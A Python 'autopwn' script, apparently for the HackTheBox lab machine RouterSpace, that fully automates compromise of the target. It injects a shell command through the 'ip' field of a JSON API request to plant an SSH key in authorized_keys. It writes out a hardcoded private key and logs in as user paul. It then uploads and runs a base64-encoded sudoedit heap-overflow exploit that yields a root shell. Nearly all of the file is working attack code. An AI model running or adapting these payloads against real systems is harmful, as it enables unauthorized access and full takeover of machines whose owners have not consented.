import requests
try:
    from pwn import *
    print("\n[\033[1;32m+\033[1;37m] Autopwn RouterSpace ~ GatoGamer1155\n")
except:
    print("\n[\033[1;31m!\033[1;37m] El script necesita privilegios de root\n\n[\033[1;31m!\033[1;37m] Recuerda tener instalada la libreria pwntools\n")
    exit(1)

def kill(sig, frame):
    print("\n[\033[1;31m-\033[1;37m] Saliendo\n")
    sys.exit(1)

signal.signal(signal.SIGINT, kill)

rsa = ("-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAArAAAABNlY2RzYS\n1zaGEyLW5pc3RwNTIxAAAACG5pc3RwNTIxAAAAhQQAV+el7yuxnYFf7OIrTmrtkcCc+SIX\nB2Kx57Iy7C6tqnRt9a75XTAg+BMLS2bBVu5GOfUJmzb1MdGwS3qXjng8P2EA3x5Wbk3QKX\n53brevFwG7DTCJ+Y4w+rO7LGcUx26pNS0IOTPTlOiIAmW55vDm1X0XRVR1yQkZKAuY6JyE\nMyaO5JcAAAEQabjlkWm45ZEAAAATZWNkc2Etc2hhMi1uaXN0cDUyMQAAAAhuaXN0cDUyMQ\nAAAIUEAFfnpe8rsZ2BX+ziK05q7ZHAnPkiFwdiseeyMuwurap0bfWu+V0wIPgTC0tmwVbu\nRjn1CZs29THRsEt6l454PD9hAN8eVm5N0Cl+d263rxcBuw0wifmOMPqzuyxnFMduqTUtCD\nkz05ToiAJluebw5tV9F0VUdckJGSgLmOichDMmjuSXAAAAQgDqFgsGASYZOcTRf2U760nc\nmu4YpvT7/Q0vKEuz9l70jUalAI/F9nf08dpXjE/2/BiUNKXDvaVYUW1eFaIBu3W4aAAAAB\nJFQ0RTQSA1MjEgYml0IEtleXM=\n-----END OPENSSH PRIVATE KEY-----")
pub = (b"ecdsa-sha2-nistp521 AAAAE2VjZHNhLXNoYTItbmlzdHA1MjEAAAAIbmlzdHA1MjEAAACFBABX56XvK7GdgV/s4itOau2RwJz5IhcHYrHnsjLsLq2qdG31rvldMCD4EwtLZsFW7kY59QmbNvUx0bBLepeOeDw/YQDfHlZuTdApfndut68XAbsNMIn5jjD6s7ssZxTHbqk1LQg5M9OU6IgCZbnm8ObVfRdFVHXJCRkoC5jonIQzJo7klw== ECDSA 521 bit Keys")

os.system('echo "%s" > key' % (rsa))

target = "http://10.10.11.148/api/v4/monitoring/router/dev/check/deviceAccess"
data = '''{"ip":"127.0.0.1; echo ecdsa-sha2-nistp521 AAAAE2VjZHNhLXNoYTItbmlzdHA1MjEAAAAIbmlzdHA1MjEAAACFBABX56XvK7GdgV/s4itOau2RwJz5IhcHYrHnsjLsLq2qdG31rvldMCD4EwtLZsFW7kY59QmbNvUx0bBLepeOeDw/YQDfHlZuTdApfndut68XAbsNMIn5jjD6s7ssZxTHbqk1LQg5M9OU6IgCZbnm8ObVfRdFVHXJCRkoC5jonIQzJo7klw== ECDSA 521 bit Keys > ~/.ssh/authorized_keys"}'''
headers = {"Content-Type": "application/json","User-Agent": "RouterSpaceAgent"}

requests.post(target, data=data, headers=headers)
time.sleep(1)

request = ssh(host='10.10.11.148', user='paul', keyfile='key')
shell = request.process("/bin/sh")
payload = (b"aW1wb3J0IG9zLHN1YnByb2Nlc3Msc3lzLHpsaWIsYmFzZTY0LHNvY2tldCxpcGFkZHJlc3MKZnJv\nbSBjdHlwZXMgaW1wb3J0IGNkbGwsIGNfY2hhcl9wLCBQT0lOVEVSLCBjX2ludCwgY192b2lkX3AK\nClNVRE9fUEFUSCA9IGIiL3Vzci9iaW4vc3VkbyIKCmxpYmMgPSBjZGxsLkxvYWRMaWJyYXJ5KCJs\naWJjLnNvLjYiKQoKTENfQ0FUUyA9IFsKCWIiTENfQ1RZUEUiLCBiIkxDX05VTUVSSUMiLCBiIkxD\nX1RJTUUiLCBiIkxDX0NPTExBVEUiLCBiIkxDX01PTkVUQVJZIiwKCWIiTENfTUVTU0FHRVMiLCBi\nIkxDX0FMTCIsIGIiTENfUEFQRVIiLCBiIkxDX05BTUUiLCBiIkxDX0FERFJFU1MiLAoJYiJMQ19U\nRUxFUEhPTkUiLCBiIkxDX01FQVNVUkVNRU5UIiwgYiJMQ19JREVOVElGSUNBVElPTiIKXQoKZGVm\nIGNoZWNrX2lzX3Z1bG4oKToKCglyLCB3ID0gb3MucGlwZSgpCglwaWQgPSBvcy5mb3JrKCkKCWlm\nIG5vdCBwaWQ6CgoJCW9zLmR1cDIodywgMikKCQlleGVjdmUoU1VET19QQVRILCBbIGIic3Vkb2Vk\naXQiLCBiIi1zIiwgYiItQSIsIGIiL2FhIiwgTm9uZSBdLCBbIE5vbmUgXSkKCQlleGl0KDApCgoJ\nb3MuY2xvc2UodykKCW9zLndhaXRwaWQocGlkLCAwKQoJciA9IG9zLmZkb3BlbihyLCAncicpCgll\ncnIgPSByLnJlYWQoKQoJci5jbG9zZSgpCgoJaWYgInN1ZG9lZGl0OiBubyBhc2twYXNzIHByb2dy\nYW0gc3BlY2lmaWVkLCB0cnkgc2V0dGluZyBTVURPX0FTS1BBU1MiIGluIGVycjoKCQlyZXR1cm4g\nVHJ1ZQoJYXNzZXJ0IGVyci5zdGFydHN3aXRoKCd1c2FnZTogJykgb3IgImludmFsaWQgbW9kZSBm\nbGFncyAiIGluIGVyciwgZXJyCglyZXR1cm4gRmFsc2UKCmRlZiBjcmVhdGVfbGlieChuYW1lKToK\nCXNvX3BhdGggPSAnbGlibnNzXycrbmFtZSsnLnNvLjInCglpZiBvcy5wYXRoLmlzZmlsZShzb19w\nYXRoKToKCQlyZXR1cm4KCglzb19kaXIgPSAnbGlibnNzXycgKyBuYW1lLnNwbGl0KCcvJylbMF0K\nCWlmIG5vdCBvcy5wYXRoLmV4aXN0cyhzb19kaXIpOgoJCW9zLm1ha2VkaXJzKHNvX2RpcikKCgls\naWJ4X2I2NCA9ICdlTnFyZC9WeFkySmtaSUFCWmdZN0JoQlBBQ3Jrd0lBSkhCZ3NHSmlnYkpBeWRn\nYmN3SkFSbFdZUWdGQk1VSDBib01Mb2RBSWF6UUdsXG5lV0RHUU0xalJiT1BEWTNQaGNiblpzQVBz\naklqRFAvenMyWmxSZkN6R243ejJLR2ZsSm1uWDV6QkVCQVNuMlVkTVpPZkZRRExnaEQzJwoJd2l0\naCBvcGVuKHNvX3BhdGgsICd3YicpIGFzIGY6CgkJZi53cml0ZSh6bGliLmRlY29tcHJlc3MoYmFz\nZTY0LmI2NGRlY29kZShsaWJ4X2I2NCkpKQoKZGVmIGNoZWNrX25zY2RfY29uZGl0aW9uKCk6Cglp\nZiBub3Qgb3MucGF0aC5leGlzdHMoJy92YXIvcnVuL25zY2Qvc29ja2V0Jyk6CgkJcmV0dXJuIFRy\ndWUKCglzayA9IHNvY2tldC5zb2NrZXQoc29ja2V0LkFGX1VOSVgsIHNvY2tldC5TT0NLX1NUUkVB\nTSkKCXRyeToKCQlzay5jb25uZWN0KCcvdmFyL3J1bi9uc2NkL3NvY2tldCcpCglleGNlcHQ6CgkJ\ncmV0dXJuIFRydWUKCWVsc2U6CgkJc2suY2xvc2UoKQoKCXdpdGggb3BlbignL2V0Yy9uc2NkLmNv\nbmYnLCAncicpIGFzIGY6CgkJZm9yIGxpbmUgaW4gZjoKCQkJbGluZSA9IGxpbmUuc3RyaXAoKQoJ\nCQlpZiBub3QgbGluZS5zdGFydHN3aXRoKCdlbmFibGUtY2FjaGUnKToKCQkJCWNvbnRpbnVlCgkJ\nCXNlcnZpY2UsIGVuYWJsZSA9IGxpbmUuc3BsaXQoKVsxOl0KCgkJCWlmIHNlcnZpY2UgPT0gJ3Bh\nc3N3ZCcgYW5kIGVuYWJsZSA9PSAneWVzJzoKCQkJCXJldHVybiBGYWxzZQoKCQkJaWYgc2Vydmlj\nZSA9PSAnZ3JvdXAnIGFuZCBlbmFibGUgPT0gJ3llcyc6CgkJCQlyZXR1cm4gRmFsc2UKCglyZXR1\ncm4gVHJ1ZQoKZGVmIGdldF9saWJjX3ZlcnNpb24oKToKCW91dHB1dCA9IHN1YnByb2Nlc3MuY2hl\nY2tfb3V0cHV0KFsnbGRkJywgJy0tdmVyc2lvbiddLCB1bml2ZXJzYWxfbmV3bGluZXM9VHJ1ZSkK\nCWZvciBsaW5lIGluIG91dHB1dC5zcGxpdCgnXG4nKToKCQlpZiBsaW5lLnN0YXJ0c3dpdGgoJ2xk\nZCAnKToKCQkJdmVyX3R4dCA9IGxpbmUucnNwbGl0KCcgJywgMSlbMV0KCQkJcmV0dXJuIGxpc3Qo\nbWFwKGludCwgdmVyX3R4dC5zcGxpdCgnLicpKSkKCXJldHVybiBOb25lCgpkZWYgY2hlY2tfbGli\nY192ZXJzaW9uKCk6Cgl2ZXJzaW9uID0gZ2V0X2xpYmNfdmVyc2lvbigpCglhc3NlcnQgdmVyc2lv\nbiwgIkNhbm5vdCBkZXRlY3QgbGliYyB2ZXJzaW9uIgoKCXJldHVybiB2ZXJzaW9uWzBdID49IDIg\nYW5kIHZlcnNpb25bMV0gPj0gMjYKCmRlZiBjaGVja19saWJjX3RjYWNoZSgpOgoJbGliYy5tYWxs\nb2MuYXJndHlwZXMgPSAoY19pbnQsKQoJbGliYy5tYWxsb2MucmVzdHlwZSA9IGNfdm9pZF9wCgls\naWJjLmZyZWUuYXJndHlwZXMgPSAoY192b2lkX3AsKQoKCXNpemUxLCBzaXplMiA9IDB4ZDAsIDB4\nYzAKCW1lbXMgPSBbMF0qMzIKCglmb3IgaSBpbiByYW5nZShsZW4obWVtcykpOgoJCW1lbXNbaV0g\nPSBsaWJjLm1hbGxvYyhzaXplMikKCgltZW0xID0gbGliYy5tYWxsb2Moc2l6ZTEpCglsaWJjLmZy\nZWUobWVtMSkKCW1lbTIgPSBsaWJjLm1hbGxvYyhzaXplMikKCWxpYmMuZnJlZShtZW0yKQoJZm9y\nIGFkZHIgaW4gbWVtczoKCQlsaWJjLmZyZWUoYWRkcikKCXJldHVybiBtZW0xICE9IG1lbTIKCmRl\nZiBnZXRfc2VydmljZV91c2VyX2lkeCgpOgoKCWlkeCA9IDAKCWZvdW5kID0gRmFsc2UKCXdpdGgg\nb3BlbignL2V0Yy9uc3N3aXRjaC5jb25mJywgJ3InKSBhcyBmOgoJCWZvciBsaW5lIGluIGY6CgkJ\nCWlmIGxpbmUuc3RhcnRzd2l0aCgnIycpOgoJCQkJY29udGludWUKCQkJbGluZSA9IGxpbmUuc3Ry\naXAoKQoJCQlpZiBub3QgbGluZToKCQkJCWNvbnRpbnVlCgkJCXdvcmRzID0gbGluZS5zcGxpdCgp\nCgkJCWlmIHdvcmRzWzBdID09ICdncm91cDonOgoJCQkJZm91bmQgPSBUcnVlCgkJCQlicmVhawoJ\nCQlmb3Igd29yZCBpbiB3b3Jkc1sxOl06CgkJCQlpZiB3b3JkWzBdICE9ICdbJzoKCQkJCQlpZHgg\nKz0gMQoKCWFzc2VydCBmb3VuZCwgJyBbXDAzM1sxOzMxbSFcMDMzWzE7MzdtXSBObyBzZSBlbmN1\nZW50cmEgbGEgYmFzZSBkZSBkYXRvcyAiZ3J1cG8iICcKCXJldHVybiBpZHgKCmRlZiBnZXRfZXh0\ncmFfY2h1bmtfY291bnQodGFyZ2V0X2NodW5rX3NpemUpOgoKCWNodW5rX2NudCA9IDAKCglnaWRz\nID0gb3MuZ2V0Z3JvdXBzKCkKCW1hbGxvY19zaXplID0gbGVuKCJncm91cHM9IikgKyBsZW4oZ2lk\ncykgKiAxMQoJY2h1bmtfc2l6ZSA9IChtYWxsb2Nfc2l6ZSArIDggKyAxNSkgJiAweGZmZmZmZmYw\nCglpZiBjaHVua19zaXplID09IHRhcmdldF9jaHVua19zaXplOiBjaHVua19jbnQgKz0gMQoKCW1h\nbGxvY19zaXplID0gbGVuKCJob3N0PSIpICsgbGVuKHNvY2tldC5nZXRob3N0bmFtZSgpKSArIDEK\nCWNodW5rX3NpemUgPSAobWFsbG9jX3NpemUgKyA4ICsgMTUpICYgMHhmZmZmZmZmMAoJaWYgY2h1\nbmtfc2l6ZSA9PSB0YXJnZXRfY2h1bmtfc2l6ZTogY2h1bmtfY250ICs9IDEKCgl0cnk6CgkJaW1w\nb3J0IGlwYWRkcmVzcwoJZXhjZXB0OgoJCXJldHVybiBjaHVua19jbnQKCWNudCA9IDAKCW1hbGxv\nY19zaXplID0gMAoJcHJvYyA9IHN1YnByb2Nlc3MuUG9wZW4oWydpcCcsICdhZGRyJ10sIHN0ZG91\ndD1zdWJwcm9jZXNzLlBJUEUsIGJ1ZnNpemU9MSwgdW5pdmVyc2FsX25ld2xpbmVzPVRydWUpCglm\nb3IgbGluZSBpbiBwcm9jLnN0ZG91dDoKCQlsaW5lID0gbGluZS5zdHJpcCgpCgkJaWYgbm90IGxp\nbmUuc3RhcnRzd2l0aCgnaW5ldCcpOgoJCQljb250aW51ZQoJCWlmIGNudCA8IDI6CgkJCWNudCAr\nPSAxCgkJCWNvbnRpbnVlOwoJCWFkZHIgPSBsaW5lLnNwbGl0KCcgJywgMilbMV0KCQltYXNrID0g\nc3RyKGlwYWRkcmVzcy5pcF9uZXR3b3JrKGFkZHIgaWYgc3lzLnZlcnNpb25faW5mbyA+PSAoMyww\nLDApIGVsc2UgYWRkci5kZWNvZGUoIlVURi04IiksIEZhbHNlKS5uZXRtYXNrKQoJCW1hbGxvY19z\naXplICs9IGFkZHIuaW5kZXgoJy8nKSArIDEgKyBsZW4obWFzaykKCQljbnQgKz0gMQoJbWFsbG9j\nX3NpemUgKz0gbGVuKCJuZXR3b3JrX2FkZHJzPSIpICsgY250IC0gMyArIDEKCWNodW5rX3NpemUg\nPSAobWFsbG9jX3NpemUgKyA4ICsgMTUpICYgMHhmZmZmZmZmMAoJaWYgY2h1bmtfc2l6ZSA9PSB0\nYXJnZXRfY2h1bmtfc2l6ZTogY2h1bmtfY250ICs9IDEKCXByb2Mud2FpdCgpCgoJcmV0dXJuIGNo\ndW5rX2NudAoKZGVmIGV4ZWN2ZShmaWxlbmFtZSwgYXJndiwgZW52cCk6CglsaWJjLmV4ZWN2ZS5h\ncmd0eXBlcyA9IGNfY2hhcl9wLFBPSU5URVIoY19jaGFyX3ApLFBPSU5URVIoY19jaGFyX3ApCgoJ\nY2FyZ3YgPSAoY19jaGFyX3AgKiBsZW4oYXJndikpKCphcmd2KQoJY2VudnAgPSAoY19jaGFyX3Ag\nKiBsZW4oZW52cCkpKCplbnZwKQoKCWxpYmMuZXhlY3ZlKGZpbGVuYW1lLCBjYXJndiwgY2VudnAp\nCgpkZWYgbGNfZW52KGNhdF9pZCwgY2h1bmtfbGVuKToKCW5hbWUgPSBiIkMuVVRGLThAIgoJbmFt\nZSA9IG5hbWUubGp1c3QoY2h1bmtfbGVuIC0gMHgxOCwgYidaJykKCXJldHVybiBMQ19DQVRTW2Nh\ndF9pZF0rYiI9IituYW1lCgp0cnk6CiAgICBhc3NlcnQgY2hlY2tfaXNfdnVsbigpLCAiIFtcMDMz\nWzE7MzFtIVwwMzNbMTszN21dIExhIHZlcnNpw7NuIGRlIHN1ZG8gbm8gZXMgdnVsbmVyYWJsZSci\nCmV4Y2VwdDoKICAgIHByaW50KCIgW1wwMzNbMTszMW0hXDAzM1sxOzM3bV0gTGEgdmVyc2nDs24g\nZGUgc3VkbyBubyBlcyB2dWxuZXJhYmxlICIgKQogICAgc3lzLmV4aXQoKQoKdHJ5OgogICAgYXNz\nZXJ0IGNoZWNrX2xpYmNfdmVyc2lvbigpLCAiIFshXSBMYSB2ZXJzacOzbiBkZSBnbGliYyBlcyBk\nZW1hc2lhZG8gYW50aWd1YSAiCmV4Y2VwdDoKICAgIHByaW50KCIgW1wwMzNbMTszMW0hXDAzM1sx\nOzM3bV0gTGEgdmVyc2nDs24gZGUgZ2xpYmMgZXMgZGVtYXNpYWRvIGFudGlndWEgIikKICAgIHN5\ncy5leGl0KCkKCnRyeToKICAgIGFzc2VydCBjaGVja19saWJjX3RjYWNoZSgpLCAiIFtcMDMzWzE7\nMzFtIVwwMzNbMTszN21dIE5vIHNlIGVuY29udHLDsyBlbCBwYXF1ZXRlIGdsaWJjICIKZXhjZXB0\nOgogICAgcHJpbnQoIiBbXDAzM1sxOzMxbSFcMDMzWzE7MzdtXSBObyBzZSBlbmNvbnRyw7MgZWwg\ncGFxdWV0ZSBnbGliYyAiKQogICAgc3lzLmV4aXQoKQoKdHJ5OgogICAgYXNzZXJ0IGNoZWNrX25z\nY2RfY29uZGl0aW9uKCksICIgW1wwMzNbMTszMW0hXDAzM1sxOzM3bV0gRWwgc2VydmljaW8gbnNj\nZCBzZSBlc3TDoSBlamVjdXRhbmRvICIKZXhjZXB0OgogICAgcHJpbnQoIiBbXDAzM1sxOzMxbSFc\nMDMzWzE7MzdtXSBFbCBzZXJ2aWNpbyBuc2NkIHNlIGVzdMOhIGVqZWN1dGFuZG8gIikKCnNlcnZp\nY2VfdXNlcl9pZHggPSBnZXRfc2VydmljZV91c2VyX2lkeCgpCmFzc2VydCBzZXJ2aWNlX3VzZXJf\naWR4IDwgOSwgJyJncm91cCIgZGIgaW4gbnNzd2l0Y2guY29uZiBpcyB0b28gZmFyLCBpZHg6ICVk\nJyAlIHNlcnZpY2VfdXNlcl9pZHgKY3JlYXRlX2xpYngoIlgvWDEyMzQiKQoKRkFLRV9VU0VSX1NF\nUlZJQ0VfUEFSVCA9IFsgYiJcXCIgXSAqIDB4MTggKyBbIGIiWC9YMTIzNFxcIiBdCgpUQVJHRVRf\nT0ZGU0VUX1NUQVJUID0gMHg3ODAKRkFLRV9VU0VSX1NFUlZJQ0UgPSBGQUtFX1VTRVJfU0VSVklD\nRV9QQVJUKjMwCkZBS0VfVVNFUl9TRVJWSUNFWy0xXSA9IEZBS0VfVVNFUl9TRVJWSUNFWy0xXVs6\nLTFdCgpDSFVOS19DTU5EX1NJWkUgPSAweGYwCgpleHRyYV9jaHVua19jbnQgPSBnZXRfZXh0cmFf\nY2h1bmtfY291bnQoQ0hVTktfQ01ORF9TSVpFKSBpZiBsZW4oc3lzLmFyZ3YpIDwgMiBlbHNlIGlu\ndChzeXMuYXJndlsxXSkKCmFyZ3YgPSBbIGIic3Vkb2VkaXQiLCBiIi1BIiwgYiItcyIsIGIiQSIq\nKENIVU5LX0NNTkRfU0laRS0weDEwKStiIlxcIiwgTm9uZSBdCmVudiA9IFsgYiJaIiooVEFSR0VU\nX09GRlNFVF9TVEFSVCArIDB4ZiAtIDggLSAxKSArIGIiXFwiIF0gKyBGQUtFX1VTRVJfU0VSVklD\nRQplbnYuZXh0ZW5kKFsgbGNfZW52KDAsIDB4NDApK2IiO0E9IiwgbGNfZW52KDEsIENIVU5LX0NN\nTkRfU0laRSkgXSkKCmZvciBpIGluIHJhbmdlKDIsIHNlcnZpY2VfdXNlcl9pZHgrMik6CgllbnYu\nYXBwZW5kKGxjX2VudihpIGlmIGkgPCA2IGVsc2UgaSsxLCAweDQwKSkKaWYgc2VydmljZV91c2Vy\nX2lkeCA9PSAwOgoJZW52LmFwcGVuZChsY19lbnYoMiwgMHgyMCkpCgpmb3IgaSBpbiByYW5nZSgx\nMSwgMTEtZXh0cmFfY2h1bmtfY250LCAtMSk6CgllbnYuYXBwZW5kKGxjX2VudihpLCBDSFVOS19D\nTU5EX1NJWkUpKQoKZW52LmFwcGVuZChsY19lbnYoMTIsIDB4OTApKQplbnYuYXBwZW5kKGIiVFo9\nOiIpCmVudi5hcHBlbmQoTm9uZSkKCmV4ZWN2ZShTVURPX1BBVEgsIGFyZ3YsIGVudikK")

shell.sendline(b"echo '%s' | base64 -d > exploit.py" % (payload))
time.sleep(0.3)
shell.sendline(b"python3 exploit.py")
time.sleep(0.3)
shell.sendline(b"export HOME=/root; cd")
time.sleep(0.3)
shell.sendline(b"sudo su")
time.sleep(0.3)
shell.sendline(b"export TERM=xterm; echo 'uid=0(root)'")
shell.interactive()
